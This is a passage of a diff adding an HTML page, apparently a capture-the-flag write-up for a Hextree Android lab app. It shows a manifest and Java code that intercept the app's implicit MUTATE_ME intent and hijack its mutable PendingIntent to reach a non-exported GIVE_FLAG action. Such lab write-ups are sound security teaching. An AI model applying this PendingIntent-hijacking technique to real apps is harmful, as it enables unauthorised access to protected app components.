+<span id="cb10-25"><a href="#cb10-25" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb10-26"><a href="#cb10-26" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb10-27"><a href="#cb10-27" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb10-28"><a href="#cb10-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To obtain this flag, we need to send an intent with the action <code>io.hextree.attacksurface.GIVE_FLAG</code>. However, due to <code>android:exported="false"</code>, we cannot send this type of intent directly.</p>
+<p>On first launch, we can see that the app sends an implicit intent called <code>MUTATE_ME</code>, which contains a <code>PendingIntent</code> to call itself back with <code>GIVE_FLAG</code>. Therefore, we simply need to register <code>MUTATE_ME</code>, retrieve the <code>PendingIntent</code> and execute it.</p>
+<p>There’s just one more problem: to get the flag, we need to add an extra <code>code</code> call with a value of 42. According to the <a href="https://developer.android.com/reference/android/app/PendingIntent#FLAG_MUTABLE">Google documentation</a>, the value <code>33554432</code> corresponds to <code>FLAG_MUTABLE</code>, which allows us to modify the intent.</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MainActivity&quot;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;io.hextree.attacksurface.MUTATE_ME&quot;</span> /&gt;</span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb12"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>intent <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a>    PendingIntent pendingIntent <span class="op">=</span> intent<span class="op">.</span><span class="fu">getParcelableExtra</span><span class="op">(</span><span class="st">&quot;pending_intent&quot;</span><span class="op">);</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>pendingIntent <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a>        Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;code&quot;</span><span class="op">,</span> <span class="dv">42</span><span class="op">);</span></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a>        <span class="cf">try</span> <span class="op">{</span></span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a>            pendingIntent<span class="op">.</span><span class="fu">send</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> intent2<span class="op">);</span></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">catch</span> <span class="op">(</span>PendingIntent<span class="op">.</span><span class="fu">CanceledException</span> e<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">RuntimeException</span><span class="op">(</span>e<span class="op">);</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
